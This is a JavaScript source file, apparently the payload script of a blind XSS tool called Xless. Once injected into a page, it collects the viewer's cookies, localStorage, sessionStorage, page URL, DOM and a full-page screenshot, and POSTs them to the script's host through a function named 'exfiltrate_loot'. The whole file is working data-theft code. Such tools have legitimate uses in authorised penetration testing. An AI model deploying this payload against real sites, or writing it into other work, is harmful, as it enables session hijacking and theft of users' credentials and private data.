// Xless: The serverless Blind XSS app
// Author: Mazin Ahmed <mazin@mazinahmed.net>
// Hardened & fixed version

console.log("Loaded xless.");

var collected_data = {};
var curScript = document.currentScript;

function return_value(v) {
  return v !== undefined && v !== null ? v : "";
}

/* ---------- Storage dump (CROSS-BROWSER SAFE) ---------- */
function dumpStorage(storage) {
  try {
    var out = {};
    for (var i = 0; i < storage.length; i++) {
      var k = storage.key(i);
      out[k] = storage.getItem(k);
    }
    return JSON.stringify(out);
  } catch (e) {
    return "";
  }
}

/* ---------- Screenshot (BEST POSSIBLE CLIENT-SIDE) ---------- */
function screenshot() {
  return new Promise(async function (resolve) {
    try {
      const body = document.body;
      const html = document.documentElement;

      let totalHeight = Math.max(
        body.scrollHeight,
        body.offsetHeight,
        html.clientHeight,
        html.scrollHeight,
        html.offsetHeight
      );

      // Hard cap to prevent crashes on infinite scroll
      const MAX_HEIGHT = 20000;
      if (totalHeight > MAX_HEIGHT) totalHeight = MAX_HEIGHT;

      // Gradual scroll to trigger lazy loading
      let y = 0;
      while (y < totalHeight) {
        window.scrollTo(0, y);
        await new Promise(r => setTimeout(r, 300));
        y += window.innerHeight;
      }

      window.scrollTo(0, 0);
      await new Promise(r => setTimeout(r, 800));

      const canvas = await html2canvas(html, {
        useCORS: true,
        allowTaint: true,
        windowWidth: html.scrollWidth,
        windowHeight: totalHeight,
        scrollX: 0,
        scrollY: 0
      });

      // JPEG = much smaller payload
      resolve(canvas.toDataURL("image/jpeg", 0.75));
    } catch (e) {
      resolve("");
    }
  });
}

/* ---------- Collect data ---------- */
function collect_data() {
  return new Promise(function (resolve) {
    collected_data = {
      Location: "",
      Cookies: "",
      Referrer: "",
      "User-Agent": "",
      "Browser Time": "",
      Origin: "",
      DOM: "",
      localStorage: "",
      sessionStorage: "",
      Screenshot: ""
    };

    try { collected_data["Location"] = return_value(location.href); } catch(e) {}
    try { collected_data["Cookies"] = return_value(document.cookie); } catch(e) {}
    try { collected_data["Referrer"] = return_value(document.referrer); } catch(e) {}
    try { collected_data["User-Agent"] = return_value(navigator.userAgent); } catch(e) {}
    try { collected_data["Browser Time"] = return_value(new Date().toString()); } catch(e) {}
    try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}

    try {
      collected_data["DOM"] = return_value(
        document.documentElement.outerHTML.slice(0, 8192)
      );
    } catch(e) {}

    try { collected_data["localStorage"] = dumpStorage(localStorage); } catch(e) {}
    try { collected_data["sessionStorage"] = dumpStorage(sessionStorage); } catch(e) {}

    screenshot().then(function (img) {
      collected_data["Screenshot"] = img;
      resolve(collected_data);
    });
  });
}

/* ---------- Exfiltration ---------- */
function exfiltrate_loot() {
  var uri = new URL(curScript.src);
  var exf_url = uri.origin + "/c";

  var xhr = new XMLHttpRequest();
  xhr.open("POST", exf_url, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(JSON.stringify(collected_data));
}

/* ---------- Load html2canvas & execute ---------- */
(function (d) {
  var script = d.createElement("script");
  script.type = "text/javascript";
  script.async = true;
  script.onload = function () {
    collect_data().then(exfiltrate_loot);
  };
  script.src =
    "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js";
  d.head.appendChild(script);
})(document);
